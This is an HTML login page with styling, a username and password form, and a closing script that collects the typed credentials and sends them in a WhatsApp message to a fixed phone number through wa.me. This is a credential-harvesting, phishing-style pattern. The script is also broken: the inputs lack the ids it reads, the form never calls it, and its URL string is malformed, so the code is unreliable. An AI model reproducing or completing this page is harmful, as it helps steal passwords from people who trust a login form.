<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        /* Basic reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* Set the background image and make it cover the entire screen */
        body {
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: url('/storage/emulated/0/HTML PROJECTS/IMG_20240920_192733_626.webp') no-repeat center center/cover;
            font-family: Arial, sans-serif;
        }

        /* Transparent wrapper for the login form */
        .wrapper {
            background: rgba(255, 255, 255, 0.2); /* This makes it transparent */
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 15px 25px rgba(0, 0, 0, 0.5);
            width: 300px;
            backdrop-filter: blur(10px); /* Blurs the background behind the form */
        }

        /* Form styling */
        form {
            text-align: center;
        }

        form h1 {
            margin-bottom: 20px;
            color: white;
        }

        .input-box {
            position: relative;
            margin-bottom: 20px;
        }

        .input-box input {
            width: 100%;
            padding: 10px;
            background: rgba(255, 255, 255, 0.1);
            border: none;
            outline: none;
            color: white;
            border-radius: 5px;
            font-size: 16px;
        }

        .input-box input::placeholder {
            color: #ccc;
        }

        .remember-forgot {
            display: flex;
            justify-content: space-between;
            color: white;
            font-size: 12px;
        }

        .btn {
            background: #fff;
            color: #000;
            padding: 10px;
            border: none;
            width: 100%;
            cursor: pointer;
            border-radius: 5px;
            font-size: 18px;
            transition: 0.3s ease;
        }

        .btn:hover {
            background: #000;
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <form action="">
            <h1>Login</h1>
            <div class="input-box">
                <input type="text" placeholder="Username" required>
            </div>
            <div class="input-box">
                <input type="password" placeholder="Password" required>
            </div>
            <div class="remember-forgot">
                <label><input type="checkbox"> Remember me</label>
                <a href="https://wa.me/2560703882319">Forgot Password?</a>
            </div>
            <button type="submit" class="btn">Login</button>
        </form>
    </div>
      <script>
        function sendToWhatsApp() {
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;

            var message = `Login Details:\nUsername: ${username}\nPassword: ${password}`;
            var phoneNumber = '2560703882319';  // Replace with your WhatsApp number with country code, e.g., '256XXXXXXXXX'
            
            // Generate WhatsApp URL
            var url = `https://wa.me/2560703882319' ${phoneNumber}?text=${encodeURIComponent(message)}`;
            
            // Open WhatsApp chat with the message
            window.open(url, '_blank');
        }
    </script>
</body>
</html>
